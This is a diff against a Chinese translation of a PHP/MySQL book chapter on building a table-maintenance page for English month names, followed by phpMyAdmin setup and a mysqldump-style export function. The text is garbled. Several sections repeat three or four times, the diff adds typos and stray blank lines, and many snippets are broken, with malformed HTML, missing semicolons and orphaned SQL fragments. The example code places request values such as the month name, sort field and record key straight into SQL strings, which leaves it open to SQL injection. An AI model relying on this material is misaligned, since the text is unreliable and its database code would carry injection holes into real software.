@@ -4575,10 +4501,12 @@ affy_footer();
 
 ## 处理插入
 
-表单信息由 common inc 脚本存储在 $arr_request 数组中。可以使用相同的“require 使用 $table_name”技术来处理请求的操作。在 english_month_names.php3 的 require('common.inc'); 行之后添加以下代码行：
+表单信息由 common inc 脚本存储在 $arr_request 数组中。可以使用相同的“require 使用 $table_name”技术来处理请请求的操作。在 english_month_names.php3 的 require('common.inc'); 行之后添加以下代码行：
 
 ```php
+
 require($table_name . '_actions.inc');
+
 ```
 
 列表 7.3 显示了执行实际“插入”操作的脚本。
@@ -4586,47 +4514,78 @@ require($table_name . '_actions.inc');
 # 列表 7.3 english_month_names_actions.inc
 
 ```php
+
 <?php
+
 if ($arr_request['action'] == 'insert') {
+
 // 使用 24 小时确定 YYYY-MM-DD HH:MM:SS 格式的当前日期和时间。
+
 $current_date = date('Y-m-d H:i:s');
 
 // 动态创建插入记录所需的 SQL。键字段的值将由 MySQL
+
 // 自动生成。flg_deleted 字段的值默认为 'N'，因此不需要指定。
 
 $str_sql = "insert into
+
 $table_name
+
 (
+
 dte_created
+
 ,dte_updated
+
 ,str_month_name
+
 )
+
 values (
+
 '$current_date',
+
 '$current_date',
+
 '$arr_request['str_month_name']'
+
 );
+
 }
+
 ```
 
 
 
 
 ```php
+
 values (
+
   '$current_date',
+
   '$current_date'[str_month_name] . '.',
+
   ""
+
 )
+
 $result = mysql_db_query($dbname, $str_sql, $id_link);
+
 if (!$result) {
+
   affy_error_exit('SQL Insert Execution has failed.');
+
 }
+
 echo '<p>The row has been inserted.</p>';
+
 echo '<p>Click <a href="PHP_SELF">Here</a> for Further Table Maintenance.</p>';
 
 exit();
+
 ?>
+
 ```
 
 此脚本的执行流程非常直接。如果请求的操作是“insert”（插入），则会确定当前日期，生成并执行 SQL 语句，然后结束脚本。
@@ -4638,69 +4597,111 @@ exit();
 -   为初始化 `$str_sql` 变量创建一个骨架。只需要两个引号即可初始化一个空字符串：
 
 ```php
+
 $str_sql = "";
+
 ```
 
 -   为 SQL 插入 语句添加一个骨架。目前不需要额外的引号。
 
 ```php
+
 $str_sql = "
+
 insert into
+
 $table_name
+
 (<field_list>)
+
 values
+
 ```
 
 ## 插入记录
 
 ```
+
 (
+
 <field_values>
+
 )
+
 ```
 
 -   添加 `date_created` 字段名及其值。现在需要进行变量插值并一组单引号。由于日期值是一个字符串（例如 1999-08-21 12:23:21），它需要包含在单引号内；这是 SQL 的要求，而不是 PHP 的要求。
 
 ```php
+
 $str_sql = "
+
 insert into
+
 $table_name
+
 (
+
 date_created
+
 values
+
 '$current_date'
+
 )
+
 ```
 
 -   添加 `str_month_name` 字段名及其值。在此处出现了额外的复杂性，因为月份名称是一个数组元素。变量插值对数组元素不起作用。相反，$str_sql` 的第一部分用双引号结束，并使用连接运算符将第一部分与第二部分（数组元素）连接起来。$str_sql` 的第三部分包含结束的单引号和 SQL 语句的剩余部分。
 
 ```php
+
 $str_sql = "
+
 insert into
+
 $table_name
+
 (
+
 date_created
+
 ,str_month_name
+
 values
+
 '$current_date'
+
 " . $arr_request['str_month_name'] . ''
+
 )
+
 ```
 
 你可以通过以下技术来避免变量插值问题。你使用的技术取决于你独特的编码风格。
 
 ```php
+
 // 提前确定数组元素
+
 // 将值保存在标量变量中
+
 $str_month_name = $arr_request['str_month_name'];
+
 ```
 
 ```php
+
 // 使用标量代替数组引用。
+
 $str_sql = "
+
   ...
+
   '$str_month_name'
+
   ";
+
 ```
 
 ## 验证插入
@@ -4708,29 +4709,49 @@ $str_sql = "
 创建用于处理插入信息的 SQL 是很棒，但如果没有在表维护页面上提供一些反馈，用户如何知道插入成功了呢？我们可以显示表中的记录数量，而仍然避免处理“显示记录”功能。在 `english_month_names.php` 中的 `require($table_name, '.insert_form.inc');` 这一行之后，添加以下代码行：
 
 ```php
+
 // 选择表中的所有记录。
+
 $str_sql = "
+
 select
+
 *
+
 from
+
   $table_name
+
 where
+
   flg_deleted = 'N'
+
 ";
+
 ```
 
 ```php
+
 $result = mysql_db_query($dbname, $str_sql, $id_link);
+
 if (!$result) {
+
   affy_error_exit('SQL Select Execution has failed.');
+
 }
 
 $number_of_rows = @mysql_num_rows($result);
+
 if ($number_of_rows < 1) {
+
   echo "<p>There are no records in this table.</p>";
+
 } else {
+
   echo "<p>There are $number_of_rows record(s) in this table.</p>";
+
 }
+
 ```
 
 ## 显示记录
@@ -4740,17 +4761,29 @@ if ($number_of_rows < 1) {
 让我们从每显示一条记录开始。将以下代码添加到 `english_month_names.php` 中，显示表中记录数量的代码之后：
 
 ```html
+
 <ul>
+
 <table border="1" cellpadding="3" cellspacing="0">
+
 <?php
+
 require($table_name . '_dsp_1_rec.inc');
+
 for ($i = 0; $i < $number_of_rows; $i++) {
+
   $record = @mysql_fetch_object($result);
+
   require($table_name . '_dsp_1_rec.inc');
+
 }
+
 ?>
+
 </table>
+
 </ul>
+
 ```
 
 需要 HTML 和 PHP 的混合来完成显示工作。首先，使用 HTML 开始一个表格标签。然后使用 `require` 函数包含表头显示代码。`select` 语句返回的记录使用 `for` 语句进行迭代。每条记录都通过 `...dsp_1_rec` 文件中的代码显示，每条记录占一个 HTML 表格行。最后，关闭 HTML 表格。
@@ -4760,19 +4793,29 @@ for ($i = 0; $i < $number_of_rows; $i++) {
 ### 列表 7.4 english_month_names_dsp_1_rec_hdr.inc
 
 ```html
+
 <tr>
+
 <th>Month Name</th>
+
 <th>Last Modified</th>
+
 </tr>
+
 ```
 
 ### 列表 7.5 english_month_names_dsp_1_rec.inc
 
 ```html
+
 <tr>
+
 <td><?php echo $record->str_month_name ?></</td>>
+
 <td><?php echo $record->date_updated ?></</td>
+
 </tr>
+
 ```
 
 图 7.2 显示了在添加一条记录后的数据库表。图 7.2 显示一条记录*Displaying one record*）。请继续添加剩余 11 个月份的记录。图 7.3 显示了整年的月份。
@@ -4801,29 +4844,49 @@ for ($i = 0; $i < $number_of_rows; $i++) {
 创建用于处理插入信息的 SQL 是很棒，但如果没有在表维护页面上提供一些反馈，用户如何知道插入成功了呢？我们可以显示表中的记录数量，而仍然避免处理“显示记录”功能。在 `english_month_names.php` 中的 `require($table_name, '.insert_form.inc');` 这一行之后，添加以下代码行：
 
 ```php
+
 // Select all records in table.
+
 $str_sql = "
+
 select
+
 *
+
 from
+
   $table_name
+
 where
+
   flg_deleted = 'N'
+
 ";
+
 ```
 
 ```php
+
 $result = mysql_db_query($dbname, $str_sql, $id_link);
+
 if (!$result) {
+
   affy_error_exit('SQL Select Execution has failed.');
+
 }
 
 $number_of_rows = @mysql_num_rows($result);
+
 if ($number_of_rows < 1) {
+
   echo "<p>There are no records in this table.</p>";
+
 } else {
+
   echo "<p>There are $number_of_rows record(s) in this table.</p>";
+
 }
+
 ```
 
 ## 显示记录
@@ -4833,17 +4896,29 @@ if ($number_of_rows < 1) {
 让我们从每显示一条记录开始。将以下代码添加到 `english_month_names.php` 中，显示表中记录数量的代码之后：
 
 ```html
+
 <ul>
+
 <table border="1" cellpadding="3" cellspacing="0">
+
 <?php
+
 require($table_name . '_dsp_1_rec.inc');
+
 for ($i = 0; $i < $number_of_rows; $i++) {
+
   $record = @mysql_fetch_object($result);
+
   require($table_name . '_dsp_1_rec.inc');
+
 }
+
 ?>
+
 </table>
+
 </ul>
+
 ```
 
 需要 HTML 和 PHP 的混合来完成显示工作。首先，使用 HTML 开始一个表格标签。然后使用 `require` 函数包含表头显示代码。`select` 语句返回的记录使用 `for` 语句进行迭代。每条记录都通过 `...dsp_1_rec` 文件中的代码显示，每条记录占一个 HTML 表格行。最后，关闭 HTML 表格。
@@ -4853,19 +4928,29 @@ for ($i = 0; $i < $number_of_rows; $i++) {
 ### 列表 7.4 english_month_names_dsp_1_rec_hdr.inc
 
 ```html
+
 <tr>
+
 <th>Month Name</th>
+
 <th>Last Modified</th>
+
 </tr>
+
 ```
 
 ### 列表 7.5 english_month_names_dsp_1_rec.inc
 
 ```html
+
 <tr>
+
 <td><?php echo $record->str_month_name ?></</td>>
+
 <td><?php echo $record->date_updated ?></</td>
+
 </tr>
+
 ```
 
 图 7.2 显示了在添加一条记录后的数据库表。图 7.2 显示一条记录*Displaying one record*）。请继续添加剩余 11 个月份的记录。图 7.3 显示了整年的月份。
@@ -4898,69 +4983,111 @@ for ($i = 0; $i < $number_of_rows; $i++) {
 -   为初始化 `$str_sql` 变量创建一个骨架。只需要两个引号即可初始化一个空字符串：
 
 ```php
+
 $str_sql = "";
+
 ```
 
 -   为 SQL 插入 语句添加一个骨架。目前不需要额外的引号。
 
 ```php
+
 $str_sql = "
+
 insert into
+
 $table_name
+
 (<field_list>)
+
 values
+
 ```
 
 ## 插入记录
 
 ```
+
 (
+
 <field_values>
+
 )
+
 ```
 
 -   添加 `date_created` 字段名及其值。现在需要进行变量插值并一组单引号。由于日期值是一个字符串（例如 1999-08-21 12:23:21），它需要包含在单引号内；这是 SQL 的要求，而不是 PHP 的要求。
 
 ```php
+
 $str_sql = "
+
 insert into
+
 $table_name
+
 (
+
 date_created
+
 values
+
 '$current_date'
+
 )
+
 ```
 
 -   添加 `str_month_name` 字段名及其值。在此处出现了额外的复杂性，因为月份名称是一个数组元素。变量插值对数组元素不起作用。相反，$str_sql` 的第一部分用双引号结束，并使用连接运算符将第一部分与第二部分（数组元素）连接起来。$str_sql` 的第三部分包含结束的单引号和 SQL 语句的剩余部分。
 
 ```php
+
 $str_sql = "
+
 insert into
+
 $table_name
+
 (
+
 date_created
+
 ,str_month_name
+
 values
+
 '$current_date'
+
 " . $arr_request['str_month_name'] . ''
+
 )
+
 ```
 
 你可以通过以下技术来避免变量插值问题。你使用的技术取决于你独特的编码风格。
 
 ```php
+
 // 提前确定数组元素
+
 // 将值保存在标量变量中
+
 $str_month_name = $arr_request['str_month_name'];
+
 ```
 
 ```php
+
 // 使用标量代替数组引用。
+
 $str_sql = "
+
   ...
+
   '$str_month_name'
+
   ";
+
 ```
 
 ## 验证插入
@@ -4968,29 +5095,86 @@ $str_sql = "
 创建用于处理插入信息的 SQL 是很棒，但如果没有在表维护页面上提供一些反馈，用户如何知道插入成功了呢？我们可以显示表中的记录数量，而仍然避免处理“显示记录”功能。在 `english_month_names.php` 中的 `require($table_name, '.insert_form.inc');` 这一行之后，添加以下代码行：
 
 ```php
+
 // Select all records in table.
+
 $str_sql = "
+
 select
+
 *
+
 from
+
   $table_name
+
 where
+
   flg_deleted = 'N'
+
 ";
+
 ```
 
 ```php
+
 $result = mysql_db_query($dbname, $str_sql, $id_link);
+
 if (!$result) {
+
   affy_error_exit('SQL Select Execution has failed.');
+
 }
 
 $number_of_rows = @mysql_num_rows($result);
+
 if ($number_of_rows < 1) {
+
   echo "<p>There are no records in this table.</p>";
+
 } else {
+
   echo "<p>There are $number_of_rows record(s) in this table.</p>";
+
 }
+
+```
+
+
+
+
+from`$table_name`
+
+where
+
+  flg_deleted = 'N'
+
+";
+
+```
+
+```php
+
+$result = mysql_db_query($dbname, $str_sql, $id_link);
+
+if (!$result) {
+
+  affy_error_exit('SQL Select Execution has failed.');
+
+}
+
+$number_of_rows = @mysql_num_rows($result);
+
+if ($number_of_rows < 1) {
+
+  echo "<p>There are no records in this table.</p>";
+
+} else {
+
+  echo "<p>There are $number_of_rows record(s) in this table.</p>";
+
+}
+
 ```
 
 ## 显示记录
@@ -5000,17 +5184,29 @@ if ($number_of_rows < 1) {
 让我们从每显示一条记录开始。将以下代码添加到 `english_month_names.php` 中，显示表中记录数量的代码之后：
 
 ```html
+
 <ul>
+
 <table border="1" cellpadding="3" cellspacing="0">
+
 <?php
+
 require($table_name . '_dsp_1_rec.inc');
+
 for ($i = 0; $i < $number_of_rows; $i++) {
+
   $record = @mysql_fetch_object($result);
+
   require($table_name . '_dsp_1_rec.inc');
+
 }
+
 ?>
+
 </table>
+
 </ul>
+
 ```
 
 需要 HTML 和 PHP 的混合来完成显示工作。首先，使用 HTML 开始一个表格标签。然后使用 `require` 函数包含表头显示代码。`select` 语句返回的记录使用 `for` 语句进行迭代。每条记录都通过 `...dsp_1_rec` 文件中的代码显示，每条记录占一个 HTML 表格行。最后，关闭 HTML 表格。
@@ -5020,19 +5216,29 @@ for ($i = 0; $i < $number_of_rows; $i++) {
 ### 列表 7.4 english_month_names_dsp_1_rec_hdr.inc
 
 ```html
+
 <tr>
+
 <th>Month Name</th>
+
 <th>Last Modified</th>
+
 </tr>
+
 ```
 
 ### 列表 7.5 english_month_names_dsp_1_rec.inc
 
 ```html
+
 <tr>
-<td><?php echo $record->str_month_name ?></</td>>
-<td><?php echo $record->date_updated ?></</td>
+
+<td><?php echo $record->str_month_name ?></td>
+
+<td><?php echo $record->date_updated ?></td>
+
 </tr>
+
 ```
 
 图 7.2 显示了在添加一条记录后的数据库表。图 7.2 显示一条记录*Displaying one record*）。请继续添加剩余 11 个月份的记录。图 7.3 显示了整年的月份。
@@ -5060,38 +5266,58 @@ for ($i = 0; $i < $number_of_rows; $i++) {
 
 创建用于处理插入信息的 SQL 是很棒，但如果没有在表维护页面上提供一些反馈，用户如何知道插入成功了呢？我们可以显示表中的记录数量，而仍然避免处理“显示记录”功能。
 
-| HTML | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | 排序功能 |
+| HTML | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | 排序功能 |
 
 1. 将 `english_month_names.php` 中的 `$str_sql` 初始化更改为以下内容：
 
 ```php
+
 $str_sql = "
+
 select
+
  *
+
 from
+
   $table_name
+
 where
+
   flg_deleted = 'N'
+
 ORDER BY $sort_field $sort_direction
+
 "
+
 ```
 
 2. 替换 `english_month_names_dsp_1_rec_hdr.php` 中的表头代码为以下内容：
 
 ```html
+
 <tr
+
   <th>Month Name <a href="PHP_SELF?action=set_sort_field&field=str_month_name&sort_direction=<?php echo ($sort_direction == 'ASC') ? 'DESC' : 'ASC'; ?>"><?php echo ($sort_direction == 'ASC') ? '▼' : '▲'; ?></a></th>
+
   <th>Last Modified <a href="PHP_SELF?action=set_sort_field&field=date_updated&sort_direction=<?php echo ($sort_direction == 'ASC') ? 'DESC' : 'ASC'; ?>"><?php echo ($sort_direction == 'ASC') ? '▼' : '▲'; ?></a></th>
+
 </tr>
+
 ```
 
 3. 在 `english_month_names_actions.php` 文件中，第一个 `<?php` 之后之后添加以下代码：
 
 ```php
+
 if ($arr_request['action'] == 'set_sort_field') {
+
   $sort_field = $arr_request['field'];
+
   $sort_direction = $arr_request['sort_direction'];
+
 }
+
 ```
 
 4. 刷新 `english_month_names.php` 页面并点击列头进行排序。
@@ -5104,10 +5330,15 @@ if ($arr_request['action'] == 'set_sort_field') {
 书中的每行代码都需要保持在 60 个字符以内，以避免换行到下一行。这强制要求像步骤 2 那样使用临时变量。具体来说，指的是：
 
 ```php
+
 $act = "action=set_sort_field";
+
 $sort = "sort_field=str_month_name";
+
 $asc = "sort_direction=ASC";
+
 echo "<a href=\$PHP_SELF?\$act=$sort&$asc="></a>";
+
 ```
 
 当 PHP 处理类似 `file.php?variable1=value&variable2=value` 的 URL 请求时，这些变量会被放在 `$HTTP_GET_VARS` 数组中。相应的，`common.inc` 脚本会将这些元素复制到 `$arr_request` 数组中。第 5 章提供了这种技术背后的原理。
@@ -5129,151 +5360,249 @@ echo "<a href=\$PHP_SELF?\$act=$sort&$asc="></a>";
 ### 列表 7.6 english_month_names.php3，版本 2
 
 ```php
+
 <?php // english_month_names.php3
 
 // 指定正在维护的表
+
 $table_name = 'english_month_names';
 
 // 新：将变量初始化为它们的默认
+
 // 值。
+
 $number_records_to_display = 5;
+
 $initial_record = 0;
+
 $sort_field = 'str_month_name';
+
 $sort_direction = 'ASC';
 
 require('common.inc');
 
 // 新：如果基于 URL 的 initial_record 值存在，
+
 // 则用基于 URL 的值覆盖默认
+
 // 值。
+
 if (strlen($arr_request['initial_record'])) {
+
 $initial_record = $arr_request['initial_record'];
+
 $sort_field = $arr_request['sort_field'];
+
 $sort_direction = $arr_request['sort_direction'];
+
 }
 
 require($table_name . '_actions.inc');
+
 affy_header("Record Maintenance: $table_name");
+
 ?>
 
 <h1>
+
 Record Maintenance:&nbsp;
+
 <font color="green">
+
 <?php echo $table_name; ?>
+
 </font>
-</</h1>
+
+</h1>
 
 <?php
+
 require($table_name . '_insert_form.inc');
 
 // 新：此 SQL 用于初始化
+
 // $number_of_records 变量。
+
 $str_sql_all = " *
+
 select count(*) as number_of_records
+
 from $table_name
+
 where flg_deleted='N'
+
 ";
+
 ```
 
 ```php
+
 $result = 
+
 mysql_db_query($dbname, $str_sql_all, $id_link);
 
 if (! $result) {
+
 affy_error_exit('SQL Select Execution has failed.');
+
 }
+
 ```
 
 ```php
+
 // 新：将返回的行转换为对象。然后
+
 // 从对象中初始化我们的变量。
+
 $record = @mysql_fetch_object($result)
+
 $number_of_records = $record->number_of_records;
+
 ```
 
 ```php
+
 // 新：LIMIT 子句是 MySQL 特有的。它让
+
 // 你可以指定从哪条记录开始结果集，
+
 // 以及返回多少条。
+
 if (strlen($sort_field) == 0) {
+
 $str_sql = "
+
 select *
+
 from $table_name
+
 where flg_deleted='N'
+
 limit $initial_record, $number_records_to_display";
+
 } else {
+
 $str_sql = "
+
 select *
+
 from $table_name
+
 where flg_deleted='N'
+
 order by $sort_field $sort_direction
+
 limit $initial_record, $number_records_to_display";
+
 }
+
 ```
 
 ```php
+
 $result = mysql_db_query($dbname, $str_sql, $id_link);
+
 if (! $result) {
+
 affy_error_exit('SQL Select Execution has failed.');
+
 }
+
 ```
 
 ```php
+
 $number_of_records_on_current_page = @mysql_num_rows($result);
+
 ```
 
 ```php
+
 if ($number_of_records < 1) {
+
 echo '<p>There are no records</p>';
+
 }
+
 else {
+
 // 新：确定要显示的记录集的
+
 // 起始位置。
+
 $next_index =
+
 $initial_record + $number_records_to_display;
 
 // 新：如果下一个位置大于数据库
+
 // 表中的记录数，则将下一个位置
+
 // 重置为表的末尾。
+
 if ($next_index > $number_of_records) {
+
 $next_index = $number_of_records;
+
 }
 
 // 新：显示消息让用户知道他们在
+
 // 数据库中的位置。
+
 $tl = $initial_record + 1;
+
 echo "<p>displaying $tl to $next_index
+
 of records</p>";
 
 // 新：确定上一组记录的
+
 // 起始位置。
+
 $prev_index = $initial_record - $number_records_to_display;
 
 // 新：起始位置不能小于
+
 // 0。
+
 if ($prev_index < 0) {
+
 $prev_index = 0;
+
 }
+
 }
+
 ```
 
 
 
 ```php
+
 $table_name
+
 where
+
 key_$table_name = $key
 
 $result = mysql_db_query($dbname, $str_sql, $id_link);
+
 if (! $result) {
+
     affy_error_exit(' Delete Execution has failed.');
+
 }
 
 echo '<<p>The row has been deleted.</p>';
+
 echo "<Click <a href=\"PHP_SELF\">Here</a> ";
+
 echo '/for Further Table Maintenance.</p>';
 
 exit();
+
 ```
 
 结果网页页如图 7.4 所示。
@@ -5293,103 +5622,167 @@ exit();
 - 1. 修改 `english_month_names_dsp_1_rec.inc` 以添加一个编辑文本链接。在初始化部分添加以下行：
 
 ```php
+
 $edit = "$PHP_SELFaction=edit_record&key=$key";
+
 ```
 
 并在删除文本链接之后添加此行：
 
 ```html
+
 <a href="<?php echo $edit;">Edit</a>
+
 ```
 
 - 2. 在 `english_month_names_actions.inc` 文件中添加以下两个动作：
 
 ```php
+
 if ($arr_request['action'] == 'edit_record') {
+
     $key = $arr_request['key'];
 
     $str_sql = "
+
     select *
+
     from $table_name
+
     where key_$table_name = $key";
 
     $result = mysql_db_query($dbname, $str_sql, $id_link);
+
     if (!$result) {
+
         affy_error_exit('SQL Select Execution has failed.');
+
     }
+
     $record = @mysql_fetch_object($result);
+
     $str_month_name = $record->str_month_name;
 
     // 以下是一个大的 echo 语句
+
     // 用于显示编辑 Web 页面。
+
 ```
 
-## 第 07 章 / 间插：维护列表
+## 第 07 章 / 间插：维护列列表
 
 ```php
+
 echo "
+
 <H1>
+
 Record Maintenance:&nbsp;
+
 <font color=\"green\">table_name</font>
+
 </h1>
+
 <H2>
+
 Editing Record:&nbsp;
+
 <font color=\"green\">key</font>
+
 </h2>",
+
 ```
 
 ```html
+
 <form action="PHPSELF" method="post">
+
 <input type="hidden" name="action" value="update">
+
 <input type="hidden" name="key" value="$key">
+
 <table cellpadding="3">
+
     <tr>
+
         <td>Month Name:</td>
+
         <td>
+
             <input type="text" name="str_month_name" value="$str_month_name">
+
         </td>
+
     </tr>
+
     <tr colspan="2">
+
         <input type="submit" value="Update">
+
     </tr>
+
 </table>
+
 </form>
+
 ```
 
 ```php
+
 exit();
 
 if ($arr_request['action'] == 'update') {
+
     $key = $arr_request['key'];
+
     $str_month_name = $arr_request['str_month_name'];
+
     $current_date = date('Y-m-d H:i:s');
 
     $str_sql = "update
+
     $table_name
+
     set
+
     str_month_name = '$str_month_name'
+
     dte_updated = '$current_date'
+
     where
+
     key_$table_name = $key";
+
 }
+
 ```
 
 ## 克隆记录
 
 ```php
+
 $result = mysql_db_query($dbname, $str_sql, $id_link);
+
 if (!$result) {
+
     affy_error_exit('SQL Delete Execution has failed.');
+
 }
+
 ```
 
 ```php
+
 echo '<p>The row has been updated.</p>';
+
 echo '<p>Click <a href="PHP_SELF">Here</a> ';
+
 echo '<p>for Further Table Maintenance.</p>';
 
 exit();
+
 }
+
 ```
 
 ![](img/60cf9e8f697416e18e3ca18e3d4f7f4e_192_0.png)
@@ -5405,65 +5798,111 @@ exit();
 ## 列表 7.7 get_record_info 函数，位于 actions 文件
 
 ```php
+
 function get_record_info() {
+
     // 使用 global 获取来自 Web 
+
     // 作用域的变量
+
     global $dbname, $table_name, $id_link, $key;
 
     $str_sql = "
+
     select *
+
     from $table_name
+
     where key_$table_name = $key";
 
     $result = mysql_db_query($dbname, $str_sql, $id_link);
+
     if (!$result) {
+
         affy_error_exit('SQL Select Execution has failed.');
+
     }
 
     // 将结果转换为对象。
+
     $record = @mysql_fetch_object($result);
+
     $str_month_name = $record->str_month_name;
+
 }
+
 ```
 
 ## 列表 7.8 display_form，位于 actions 文件
 
 ```php
+
 function display_form($key, $str_month_name, $action) {
+
     global $PHP_SELF;
+
     echo "
+
 <form action=\"\$PHP_SELF\" method=\"post\">
+
 <input type=\"hidden\" name=\"action\" value=\"$action\">
+
 <input type=\"hidden\" name=\"key\" value=\"$key\">
+
 <table cellpadding=\"3\">
+
     <tr>
+
         <td>Month Name:</td>
+
         <td>
+
             <input type=\"text\" name=\"str_month_name\" value=\"$str_month_name\">
+
         </td>
+
     </tr>
+
     <tr colspan=\"2\">
+
         <input type=\"submit\" value=\"Update\">
+
     </tr>
+
 </table>
+
 </form>";
+
 }
+
 ```
 
 ## 列表 7.9 display_heading，位于 actions 文件
 
 ```php
+
 function display_heading($table_name, $key, $activity) {
+
     echo "
+
 <H1>
+
 Record Maintenance:&nbsp;
+
 <font color=\"green\">$table_name</font>
+
 </h1>
+
 <H2>
+
 $activity Record:&nbsp;
+
 <font color=\"green\">$key</font>
+
 </h2>";
+
 }
+
 ```
 
 
@@ -5550,13 +5989,17 @@ phpMyAdmin 的创建——与大多数开源项目一样——是因为作者对
 6. 在配置文件中搜索以下行，并将下行行中的空字符串替换为你为 MySQL 选择的密码。
 
 ```php
+
 $cfgServers[1]['password'] = '';
+
 ```
 
 7. 在配置文件中搜索以下行，并将“german”替换为你偏好使用的语言。你的选项有“chinese_big5”、“chinese_gb”、“danish”、“english”、“french”、“german”、“italian”、“norwegian”、“russian_koi8”、“russian-win1251”和“spanish”。
 
 ```php
+
 require("german.php3");
+
 ```
 
 8. 保存更改并关闭编辑器。
@@ -5569,14 +6012,18 @@ require("german.php3");
 
 你可以在 http://www.apache.com/features/userauth 获取 Apache 认证方法的概述。另一篇教程位于 http://deepthought.texsci.edu/protected_dirs.html。
 
-许多搜索引擎会在 Web 服务器根目录下查找一个名为 robots.txt 的文件。如果你还没有创建此文件（可能在第 2 章的安装步骤中），请创建一个名为 /usr/local/apache/htdocs/robots.txt 文件，包含列表 8.1 中的行。
+许多搜索引擎会在 Web 服务器根目下查找一个名为 robots.txt 的文件。如果你还没有创建此文件（可能在第 2 章的安装步骤中），请创建一个名为 /usr/local/apache/htdocs/robots.txt 文件，包含列表 8.1 中的行。
 
 **列表 8.1** robots.txt——此文件阻止许多搜索引擎窥探私人目录
 
 ```text
+
 #robots.txt for (hostname)
+
 User-agent *
+
 Disallow: /phpMyAdmin/
+
 ```
 
 为每个你需要保持私有的目录再添加一条 Disallow 行。
@@ -5596,7 +6043,9 @@ HTTP “Basic”认证（有关身份验证的信息请参阅第 13 章“身份
 可验证的用户列表通过一个名为 `htpasswd` 的工具（随 Apache 绑定）进行维护。如果你使用 `-c` 选项启动 `htpasswd`，它会在加密文件中创建一个新用户。例如，以下命令会在名为 `/usr/local/apache/phpMyAdmin.users` 的用户列表中创建一个名为 `phpMyAdmin` 的用户。请注意，该文件位于 Web 服务器的文档根之上，以增强安全性。如果文件不在文档根或其下方，Web 浏览器将无法看到它。以下是创建名为 `phpMyAdmin` 用户的命令：
 
 ```
+
 htpasswd -c /usr/local/apache/phpMyAdmin.users phpMyAdmin
+
 ```
 
 随后程序会提示你指定密码。
@@ -5606,10 +6055,15 @@ htpasswd -c /usr/local/apache/phpMyAdmin.users phpMyAdmin
 在你创建了新的 `htpasswd` 用户后，你需要创建一个名为 `/usr/local/apache/htdocs/phpMyAdmin/.htaccess` 的控制文件，内容如下：
 
 ```
+
 AuthName "phpMyAdmin"
+
 AuthType Basic
+
 AuthUserFile /usr/local/apache/phpMyAdmin.users
+
 require user phpMyAdmin
+
 ```
 
 就是这样。现在你应该能够通过 Web 浏览器打开 http://localhost/phpMyAdmin/ 来启动 phpMyAdmin。在发生任何事情之前，你的 Web 浏览器当然会要求你输入刚刚创建的用户名和密码。如果你现在正看着 phpMyAdmin 的欢迎界面，说明一切正常，你已经准备好使用 phpMyAdmin 了。
@@ -5631,9 +6085,13 @@ require user phpMyAdmin
 随 MySQL 一起绑定的，你会找到一个名为 `mysqldump` 的工具；它将表的结构和数据导出到一系列 SQL 语句。该函数的输出看起来如下：
 
 ```
+
 INSERT INTO accounts VALUES ('drip-joy','kirsten','mcdonald');
+
 INSERT INTO accounts VALUES ('randy','Randy','Panter');
+
 INSERT INTO accounts VALUES ('temp','temp','temp');
+
 ```
 
 在第 3 章中，你学习了变量变量，我告诉过你不认为使用它们很有意义。但你也可以拥有变量*函数*名，这些在有时非常有用。`mysqldump` 用于生成其 SQL 语句的算法使用了变量函数。
@@ -5641,63 +6099,109 @@ INSERT INTO accounts VALUES ('temp','temp','temp');
 使用变量函数很容易——只需使用语法 `$variable_function_name()`。例如：
 
 ```
+
 function foo() {
+
   return "Hello World";
+
 }
+
 ```
 
 ```
+
 $var_function = "foo";
+
 echo $var_function();
+
 ```
 
 这些构造结构很有用，因为它们让你实现自定义的*回调函数*。回调函数是一个用户定义的函数，在运行时从另一个函数调用。确实，这听起来并不那么兴奋。但让我们来看一下将表数据导出为 SQL 插入语句的函数概念。第一方法是遍历表的所有记录，并为每一行打印 SQL 命令。这当然行得通，但该函数非常有限：它以 SQL 命令的形式打印表的内容，仅此而已。但 SQL 导出还有更多用途；例如，你可能希望通过将表内容复制到另一个数据库服务器来创建每日备份。为了完成此任务，你需要编写一个稍微修改过的 `dump-table` 函数。更优雅的解决方案是将应用程序逻辑与其处理的数据分离。我们只需要返回字符串并让开发者对它做任何他们想做的事；这样构建了一个通用库。完整的函数如下：
 
 ```
+
 // 获取 $table 的内容作为一系列
+
 // INSERT 语句。
+
 ```
 
 ```
+
 // 在每一行之后，一个自定义的回调函数
+
 // 处理器会被调用。该回调函数
+
 // 必须接受一个参数 ($schema_insert)。
+
 ```
 
 ```
+
 // 在调用此函数 get_table_content 之前，
+
 // 必须建立了到数据库的连接。
+
 ```
 
 ```
+
 function get_table_content($db, $table, $handler) {
+
     // 如果查询不起作用，
+
     $result = mysql_query($db, "SELECT * FROM $table");
+
     if (!$result) {
+
         die();
+
     }
+
     // 为每一行构建一个 SQL insert
+
     while ($row = mysql_fetch_row($result)) {
+
         $schema_insert = "INSERT INTO $table (";
+
         for ($j=0; $j < num_fields($result); $j++) {
+
             $schema_insert .= field_name($j);
+
             if ($j < num_fields($result) - 1) {
+
                 $schema_insert .= ", ";
+
             }
+
         }
+
         $schema_insert .= ") VALUES";
+
         for ($j=0; $j < num_fields($result); $j++) {
+
             $schema_insert .= "'" . addslashes($row[$j]) . "'";
+
             if ($j < num_fields($result) - 1) {
+
                 $schema_insert .= ", ";
+
             }
+
         }
+
         $schema_insert .= ");";
+
         // 调用回调函数
+
         $handler($schema_insert);
+
     }
+
     return true;
+
 }
+
 ```
 
 ## 变量函数：导出表数据
@@ -5705,20 +6209,27 @@ function get_table_content($db, $table, $handler) {
 `get_table_content` 的第三参数是 handler，它在处理每行后都会调用。要使用它，你可以：
 
 ```php
+
 function handler($schema_insert) {
+
     echo $schema_insert . "\n";
+
 }
+
 get_table_content($db, "table", "handler");
+
 ```
 
 逻辑或构造只是这种简写。要理解它，你需要记住第 3 章关于逻辑运算符的内容：逻辑与逻辑或都有短路功能。与运算符的目标是判断它的操作数是否都为真。PHP 确定第一个操作数为假，则第二个操作数不需要评估。如果第一个表达式 ($mysql_query(...)) 结果为假，因为查询失败，PHP 将评估第二个表达式 (mysql_die())——这就是终止脚本的函数。
 
 ## 示例查询，或构建用户定义页面
 
